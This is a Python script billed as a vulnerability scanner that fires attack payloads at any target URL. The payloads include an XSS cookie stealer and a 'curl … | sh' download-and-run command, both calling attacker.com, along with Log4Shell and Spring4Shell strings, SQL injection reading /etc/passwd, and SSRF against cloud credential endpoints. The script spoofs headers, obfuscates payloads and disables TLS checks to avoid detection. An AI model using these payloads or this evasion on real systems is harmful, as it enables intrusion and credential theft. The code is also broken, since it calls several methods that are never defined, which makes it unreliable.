"""
HoTPotScanner Ultimate - Modern Vulnerability Scanner
Covers OWASP Top 10 2023 + API Security + Cloud-Native Threats
"""

import requests
import json
import re
import time
import random
import base64
import hashlib
from urllib.parse import urlparse, quote
from difflib import SequenceMatcher
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

BANNER = f"""{Fore.CYAN}
██╗  ██╗ ██████╗ ████████╗██████╗  ██████╗ ████████╗
██║  ██║██╔═══██╗╚══██╔══╝██╔══██╗██╔═══██╗╚══██╔══╝
███████║██║   ██║   ██║   ██████╔╝██║   ██║   ██║   
██╔══██║██║   ██║   ██║   ██╔═══╝ ██║   ██║   ██║   
██║  ██║╚██████╔╝   ██║   ██║     ╚██████╔╝   ██║   
╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝    ╚═╝   
{Style.RESET_ALL}{Fore.YELLOW}Ultimate API Security Scanner v3.0{Style.RESET_ALL}
"""

# Modern Attack Payload Database (2023-2024)
PAYLOAD_DB = {
    "sql": [
        ("' OR 1=1-- -", "boolean"),
        ("1' WAITFOR DELAY '0:0:5'--", "time-based"),
        ("1' UNION SELECT @@version,2,3--", "error-based"),
        ("1'/**/uNiOn/**/SeLeCt/**/LOAD_FILE('/etc/passwd')--", "obfuscated")
    ],
    "xss": [
        ("<script>fetch(`http://attacker.com?c=${document.cookie}`)</script>", "stealer"),
        ("<img src=x onerror=alert(window.origin)>", "dom-based"),
        ("{{7*'7'}}", "template"),
        ("javascript:document.location='http://attacker.com/'", "url-based")
    ],
    "ssrf": [
        ("http://metadata.google.internal/computeMetadata/v1beta1/", "gcp-metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws-metadata"),
        ("http://[::ffff:169.254.169.254]/latest/api/token", "ipv6-bypass"),
        ("http://localhost:2375/version", "docker-api")
    ],
    "nosql": [
        ("{'$where': '1 == 1'}", "mongo-where"),
        ("'; while(true){}", "mongo-js"),
        ("|| '1'=='1", "redis-cli"),
        ("[ne]=", "parameter-pollution")
    ],
    "rce": [
        ("; curl http://attacker.com/shell.sh | sh", "unix-shell"),
        ("|nslookup attacker.com", "pipe-redirect"),
        ("`ping -c 4 attacker.com`", "backtick"),
        ("${jndi:ldap://attacker.com/exploit}", "log4shell")
    ],
    "api": [
        ("/api/v1/users/../../config", "path-traversal"),
        ("/graphql?query={__schema{types{name}}}", "introspection"),
        ("/v3/api-docs", "swagger-exposure"),
        ("/actuator/gateway/routes", "spring-cloud")
    ]
}

class HoTPotScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers = self._gen_headers()
        self.findings = []
        self.rate_limit = (0.3, 1.2)
        self.fingerprints = self._load_fingerprints()
        
    def _gen_headers(self):
        """Generate evasive headers with random metadata"""
        return {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
            ]),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.0.1",
            "Accept": "application/json, text/html;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br, zstd"
        }

    def _load_fingerprints(self):
        """Vulnerability response signatures"""
        return {
            "sql_error": re.compile(r"(syntax error|mysql_fetch|pg_exec)", re.I),
            "xss_success": re.compile(r"(<script>|alert\(|document\.cookie)", re.I),
            "rce_success": re.compile(r"(root:x:|microsoft corp|docker version)", re.I),
            "ssrf_success": re.compile(r"(aws-key|metadata|docker api)", re.I)
        }

    def _send_request(self, method, endpoint, data=None):
        """Smart request handler with evasion"""
        try:
            url = f"{self.target_url}/{endpoint.lstrip('/')}"
            
            # Obfuscation techniques
            if data:
                data = {k: self._obfuscate(v) for k,v in data.items()}
            
            time.sleep(random.uniform(*self.rate_limit))
            
            return self.session.request(
                method.upper(),
                url,
                params=data if method == "GET" else None,
                json=data if method == "POST" else None,
                timeout=15,
                allow_redirects=False,
                verify=False  # Bypass SSL verification
            )
        except Exception as e:
            self._log(f"Request failed: {str(e)}", "ERROR")
            return None

    def _obfuscate(self, payload):
        """Advanced payload obfuscation"""
        techniques = [
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: quote(x),
            lambda x: x.replace(" ", "/**/"),
            lambda x: x.upper() if random.choice([True, False]) else x.lower()
        ]
        return random.choice(techniques)(payload)

    def _check_response(self, response, vuln_type):
        """Context-aware vulnerability confirmation"""
        if not response:
            return False
            
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        match vuln_type:
            case "SQLi":
                return self.fingerprints["sql_error"].search(content)
            case "XSS":
                return self.fingerprints["xss_success"].search(content)
            case "RCE":
                return self.fingerprints["rce_success"].search(content)
            case "SSRF":
                return self.fingerprints["ssrf_success"].search(headers)
            case _:
                return response.status_code == 200

    # Modern Vulnerability Checks
    def check_modern_sqli(self):
        """Advanced SQLi detection with latest bypass techniques"""
        for payload, ptype in PAYLOAD_DB["sql"]:
            try:
                res = self._send_request(
                    "POST",
                    "/api/search",
                    {"query": payload}
                )
                if self._check_response(res, "SQLi"):
                    self._log_vuln("SQLi", f"{ptype} bypass", payload)
                    return True
            except:
                continue
        return False

    def check_cloud_ssrf(self):
        """Cloud metadata + internal service SSRF"""
        for payload, service in PAYLOAD_DB["ssrf"]:
            try:
                res = self._send_request(
                    "POST",
                    "/api/fetch",
                    {"url": payload}
                )
                if self._check_response(res, "SSRF"):
                    self._log_vuln("SSRF", f"Cloud {service} exposure", payload)
                    return True
            except:
                continue
        return False

    def check_api_misconfig(self):
        """Modern API misconfigurations"""
        for endpoint, issue in PAYLOAD_DB["api"]:
            try:
                res = self._send_request("GET", endpoint)
                if res.status_code == 200:
                    self._log_vuln("API Misconfig", issue, endpoint)
                    return True
            except:
                continue
        return False

    def check_log4shell(self):
        """Log4j RCE detection (CVE-2021-44228)"""
        payload = "${jndi:ldap://attacker.com/exploit}"
        headers = {
            "X-Api-Version": payload,
            "User-Agent": payload
        }
        try:
            res = self.session.get(
                f"{self.target_url}/api/version",
                headers=headers
            )
            if "log4j" in res.text.lower():
                self._log_vuln("Log4Shell", "CVE-2021-44228", payload)
                return True
        except:
            return False

    def check_spring4shell(self):
        """Spring4Shell detection (CVE-2022-22965)"""
        payload = "class.module.classLoader.URLs[0]=http://attacker.com"
        try:
            res = self.session.post(
                f"{self.target_url}/api/users",
                data=payload,
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            if res.status_code == 400 and "beanfactory" in res.text.lower():
                self._log_vuln("Spring4Shell", "CVE-2022-22965", payload)
                return True
        except:
            return False

    # Consolidated Vulnerability Checks
    def full_scan(self):
        """Complete modern vulnerability assessment"""
        print(BANNER)
        print(f"{Fore.CYAN}[*] Scanning: {self.target_url}{Style.RESET_ALL}")
        
        checks = [
            self.check_modern_sqli,
            self.check_cloud_ssrf,
            self.check_api_misconfig,
            self.check_log4shell,
            self.check_spring4shell,
            self.check_graphql_introspection,
            self.check_jwt_weak
        ]
        
        for check in checks:
            try:
                if check():
                    print(f"{Fore.GREEN}[+] Vulnerability found!{Style.RESET_ALL}")
            except Exception as e:
                self._log(f"Check failed: {str(e)}", "ERROR")
        
        self._save_report()

    def _log_vuln(self, vuln_type, context, payload):
        """Log discovered vulnerabilities"""
        entry = {
            "type": vuln_type,
            "context": context,
            "payload": payload,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        self.findings.append(entry)
        print(f"{Fore.RED}[!] {vuln_type} Found{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Context: {context}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Payload: {payload[:60]}...{Style.RESET_ALL}\n")

    def _save_report(self):
        """Generate JSON report"""
        filename = f"scan_report_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(self.findings, f, indent=2)
        print(f"{Fore.GREEN}[*] Report saved to {filename}{Style.RESET_ALL}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    
    scanner = HoTPotScanner(sys.argv[1])
    scanner.full_scan()